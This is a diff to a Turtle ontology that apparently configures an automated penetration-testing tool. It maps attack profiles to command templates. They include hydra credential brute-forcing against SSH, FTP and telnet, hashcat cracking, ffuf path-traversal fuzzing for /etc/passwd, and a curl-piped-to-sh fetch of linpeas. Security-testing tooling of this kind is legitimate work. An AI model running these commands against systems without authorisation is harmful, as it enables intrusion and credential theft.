@@ -10,6 +10,18 @@ ns1:Profile1 a ns1:Profile ;
     ns1:profileName "http_dir_scan_small" .
 
 ns1:Profile10 a ns1:Profile ;
+    ns1:Command "sshpass -p <password> ssh <account>@<ipv4>" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter4,
+        ns1:Parameter5 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement10,
+        ns1:Requirement11,
+        ns1:Requirement9 ;
+    ns1:hasResult ns1:Result7 ;
+    ns1:profileName "ssh_connection" .
+
+ns1:Profile11 a ns1:Profile ;
     ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2,
@@ -17,20 +29,34 @@ ns1:Profile10 a ns1:Profile ;
     ns1:hasRequirement ns1:Requirement1,
         ns1:Requirement12,
         ns1:Requirement13 ;
-    ns1:hasResult ns1:Result1 ;
+    ns1:hasResult ns1:Result8 ;
     ns1:profileName "http_param_fuzz" .
 
-ns1:Profile11 a ns1:Profile ;
+ns1:Profile12 a ns1:Profile ;
+    ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?<webparam>=FUZZ -w wordlists/input_fuzzing.txt" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter2,
+        ns1:Parameter6,
+        ns1:Parameter7 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement12,
+        ns1:Requirement14,
+        ns1:Requirement15,
+        ns1:Requirement16 ;
+    ns1:hasResult ns1:Result1 ;
+    ns1:profileName "http_param_input_fuzz" .
+
+ns1:Profile13 a ns1:Profile ;
     ns1:Command "hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2 ;
     ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement14 ;
+        ns1:Requirement17 ;
     ns1:hasResult ns1:Result5,
-        ns1:Result8 ;
+        ns1:Result9 ;
     ns1:profileName "ssh_attack" .
 
-ns1:Profile12 a ns1:Profile ;
+ns1:Profile14 a ns1:Profile ;
     ns1:Command "hydra -l <account> -p <password> ssh://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2,
@@ -38,37 +64,37 @@ ns1:Profile12 a ns1:Profile ;
         ns1:Parameter5 ;
     ns1:hasRequirement ns1:Requirement1,
         ns1:Requirement10,
-        ns1:Requirement15,
-        ns1:Requirement16,
-        ns1:Requirement17 ;
+        ns1:Requirement18,
+        ns1:Requirement19,
+        ns1:Requirement20 ;
     ns1:hasResult ns1:Result5,
-        ns1:Result8 ;
+        ns1:Result9 ;
     ns1:profileName "ssh_account_password_attack" .
 
-ns1:Profile13 a ns1:Profile ;
+ns1:Profile15 a ns1:Profile ;
     ns1:Command "hydra -C wordlists/default_credentials/test.txt ftp://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2 ;
     ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement18 ;
+        ns1:Requirement21 ;
     ns1:hasResult ns1:Result5,
-        ns1:Result8 ;
+        ns1:Result9 ;
     ns1:profileName "ftp_attack" .
 
-ns1:Profile14 a ns1:Profile ;
+ns1:Profile16 a ns1:Profile ;
     ns1:Command "hydra -C wordlists/default_credentials/test.txt telnet://<ipv4>:<port> " ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2 ;
     ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement19 ;
+        ns1:Requirement22 ;
     ns1:hasResult ns1:Result5,
-        ns1:Result8 ;
+        ns1:Result9 ;
     ns1:profileName "telnet_attack" .
 
-ns1:Profile15 a ns1:Profile ;
-    ns1:Command "hashcat '<passwordHash>' /usr/share/wordlists/rockyou.txt --show" ;
-    ns1:hasParameter ns1:Parameter7 ;
-    ns1:hasRequirement ns1:Requirement20 ;
+ns1:Profile17 a ns1:Profile ;
+    ns1:Command "hashcat '<hashValue>' /usr/share/wordlists/rockyou.txt --show" ;
+    ns1:hasParameter ns1:Parameter8 ;
+    ns1:hasRequirement ns1:Requirement23 ;
     ns1:hasResult ns1:Result5 ;
     ns1:profileName "crack_hash" .
 
@@ -117,11 +143,19 @@ ns1:Profile6 a ns1:Profile ;
     ns1:profileName "full_scan" .
 
 ns1:Profile7 a ns1:Profile ;
+    ns1:Command "sudo nmap -sU <ipv4>" ;
+    ns1:hasParameter ns1:Parameter1 ;
+    ns1:hasRequirement ns1:Requirement1 ;
+    ns1:hasResult ns1:Result2,
+        ns1:Result3 ;
+    ns1:profileName "udp_scan" .
+
+ns1:Profile8 a ns1:Profile ;
     ns1:Command "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" ;
     ns1:hasRequirement ns1:Requirement7 ;
     ns1:profileName "linpeas" .
 
-ns1:Profile8 a ns1:Profile ;
+ns1:Profile9 a ns1:Profile ;
     ns1:Command "/usr/src/firmwalker/firmwalker.sh <firmware>" ;
     ns1:hasParameter ns1:Parameter3 ;
     ns1:hasRequirement ns1:Requirement8 ;
@@ -129,18 +163,6 @@ ns1:Profile8 a ns1:Profile ;
         ns1:Result5,
         ns1:Result6 ;
     ns1:profileName "firmware_analysis" .
-
-ns1:Profile9 a ns1:Profile ;
-    ns1:Command "sshpass -p <password> ssh <account>@<ipv4>" ;
-    ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter4,
-        ns1:Parameter5 ;
-    ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement10,
-        ns1:Requirement11,
-        ns1:Requirement9 ;
-    ns1:hasResult ns1:Result7 ;
-    ns1:profileName "ssh_connection" .
 
 ns1:Tool1 a ns1:Tool ;
     ns1:toolName "gobuster" ;
@@ -177,54 +199,62 @@ ns1:Tool8 a ns1:Tool ;
 ns1:Parameter3 a ns1:Parameter ;
     ns1:parameter "firmware" .
 
-ns1:Parameter6 a ns1:Parameter ;
-    ns1:parameter "page" .
-
 ns1:Parameter7 a ns1:Parameter ;
-    ns1:parameter "passwordHash" .
+    ns1:parameter "webparam" .
+
+ns1:Parameter8 a ns1:Parameter ;
+    ns1:parameter "hashValue" .
 
 ns1:Requirement11 a ns1:Requirement ;
     ns1:requirement "accountPassword" ;
     ns1:value "['Username', 'Password']" .
-
-ns1:Requirement12 a ns1:Requirement ;
-    ns1:requirement "page" ;
-    ns1:value "Webpage" .
 
 ns1:Requirement13 a ns1:Requirement ;
     ns1:requirement "deviceServices" ;
     ns1:value "['Ip', 'Port', 'http']" .
 
 ns1:Requirement14 a ns1:Requirement ;
-    ns1:requirement "deviceServices" ;
-    ns1:value "['Ip', 'Port', 'ssh']" .
+    ns1:requirement "webparam" ;
+    ns1:value "Webparam" .
 
 ns1:Requirement15 a ns1:Requirement ;
-    ns1:requirement "account" ;
-    ns1:value "Account" .
+    ns1:requirement "webpage_param" ;
+    ns1:value "['Webpage', 'WebParameter']" .
 
 ns1:Requirement16 a ns1:Requirement ;
     ns1:requirement "deviceServices" ;
-    ns1:value "['Ip', 'Port', 'ssh']" .
+    ns1:value "['Ip', 'Port', 'http']" .
 
 ns1:Requirement17 a ns1:Requirement ;
-    ns1:requirement "\\+accountPassword" ;
-    ns1:value "['Account', '_']" .
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'ssh']" .
 
 ns1:Requirement18 a ns1:Requirement ;
-    ns1:requirement "deviceServices" ;
-    ns1:value "['Ip', 'Port', 'ftp']" .
+    ns1:requirement "account" ;
+    ns1:value "Account" .
 
 ns1:Requirement19 a ns1:Requirement ;
     ns1:requirement "deviceServices" ;
-    ns1:value "['Ip', 'Port', 'telnet']" .
+    ns1:value "['Ip', 'Port', 'ssh']" .
 
 ns1:Requirement2 a ns1:Requirement ;
     ns1:requirement "deviceServices" ;
     ns1:value "['Ip', 'Port', 'http']" .
 
 ns1:Requirement20 a ns1:Requirement ;
-    ns1:requirement "passwordHash" ;
+    ns1:requirement "\\+accountPassword" ;
+    ns1:value "['Account', '_']" .
+
+ns1:Requirement21 a ns1:Requirement ;
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'ftp']" .
+
+ns1:Requirement22 a ns1:Requirement ;
+    ns1:requirement "deviceServices" ;
+    ns1:value "['Ip', 'Port', 'telnet']" .
+
+ns1:Requirement23 a ns1:Requirement ;
+    ns1:requirement "hashValue" ;
     ns1:value "Hash" .
 
 ns1:Requirement3 a ns1:Requirement ;
@@ -264,15 +294,25 @@ ns1:Result6 a ns1:Result ;
 ns1:Result7 a ns1:Result ;
     ns1:result "connection" .
 
+ns1:Result8 a ns1:Result ;
+    ns1:result "parameter" .
+
 ns1:Parameter4 a ns1:Parameter ;
     ns1:parameter "account" .
 
 ns1:Parameter5 a ns1:Parameter ;
     ns1:parameter "password" .
 
+ns1:Parameter6 a ns1:Parameter ;
+    ns1:parameter "page" .
+
 ns1:Requirement10 a ns1:Requirement ;
     ns1:requirement "password" ;
     ns1:value "Password" .
+
+ns1:Requirement12 a ns1:Requirement ;
+    ns1:requirement "page" ;
+    ns1:value "Webpage" .
 
 ns1:Result2 a ns1:Result ;
     ns1:result "port" .
@@ -280,7 +320,7 @@ ns1:Result2 a ns1:Result ;
 ns1:Result3 a ns1:Result ;
     ns1:result "service" .
 
-ns1:Result8 a ns1:Result ;
+ns1:Result9 a ns1:Result ;
     ns1:result "account" .
 
 ns1:Result1 a ns1:Result ;
